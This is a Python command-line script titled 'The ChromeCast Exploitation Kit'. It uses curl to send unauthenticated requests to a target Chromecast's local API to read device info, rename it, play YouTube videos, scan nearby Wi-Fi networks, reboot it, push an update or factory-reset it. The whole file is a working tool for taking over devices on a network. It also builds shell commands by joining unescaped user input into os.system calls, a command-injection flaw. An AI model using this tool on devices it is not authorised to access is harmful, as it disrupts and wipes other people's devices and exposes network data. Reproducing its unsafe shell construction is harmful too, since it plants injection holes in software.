#!/usr/bin/python3

import argparse
import os

parser = argparse.ArgumentParser(description='The ChromeCast Exploitation Kit')

parser.add_argument('-l', action='store_true', default=False, dest='list_actions', help='List the possible commands')
command = parser.add_argument_group('command')
command.add_argument('-a', action='store', dest='action', help='The action you want to perform on your target')
command.add_argument('-v', action='store', dest='value', help='The value for the specified action')
target = parser.add_argument_group('target')
target.add_argument('-t', action='store', dest='target', help='The target ChromeCast you want to exploit')
port = parser.add_argument_group('port')
target.add_argument('-p', action='store', dest='port', help='The target ChromeCast port you want to exploit (OPTIONAL)')


arguments = parser.parse_args()

t = arguments.target
p = arguments.port 
a = arguments.action
v = arguments.value

if arguments.list_actions:
    print(" ")
    print("available commands:")
    print(" ")
    print("play		: Play a Youtube video with ID specified in the value parameter")
    print("setName		: Set the device name to the value specified in the value parameter")
    print("scanWifi	: Scan nearby Wifi networks")
    print("reboot		: Reboot the device")
    print("update		: Update the ChromeCast over the air")
    print("factoryReset	: Resets the device to Factory Settings (USE WITH CARE)")

if t is None and not arguments.list_actions:
    parser.print_help()

# 2xdropout Check for custom port
if p is None:
    p = "8008"
else:
    print("CUSTOM PORT SET AS:  " + p + "\n")

# Default action if none is supplied: Get information
if a is None and t is not None:
    os.system('curl http://' + t + ':' + p + '/setup/eureka_info | python3 -mjson.tool')
elif a == 'setName' and t is not None:
    if v is None:
        print("Error: Please specify a value")
        exit()
    os.system('curl -X POST -H "Content-Type: application/json" -d \'{\"name\": \"' + v + '\"}\' http://' + t + ''
              ':' + p + '/setup/set_eureka_info -v') 
elif a == 'play' and t is not None:
    if v is None:
        print("Error: Please specify a value")
        exit()
    os.system('curl -H "Content-Type: application/json" http://' + t + ':' + p + '/apps/YouTube -X POST -d \"v=' + v + '\"')
elif a == 'scanWifi' and t is not None:
    os.system('curl http://' + t + ':' + p + '/setup/scan_results | python3 -mjson.tool')
elif a == 'reboot' and t is not None:
    os.system('curl -H "Content-Type: application/json" http://' + t + ':' + p + '/setup/reboot -d \'{"params":"now"}\' -X '
                                                                       'POST')
elif a == 'update' and t is not None:
    os.system('curl -H "Content-Type: application/json" http://' + t + ':' + p + '/setup/reboot -d \'{"params":"ota '
                                                                       'foreground"}\' -X POST')
elif a == 'factoryReset' and t is not None:
    if input("Are you sure you want to reset the device to factory settings? (y/n): ") != "y":
        exit()
    os.system('curl -H "Content-Type: application/json" http://' + t + ':' + p + '/setup/reboot -d \'{"params":"fdr"}\' -X '
                                                                       'POST')
elif a is not None and t is None:
    print("Error: Please specify a target device")
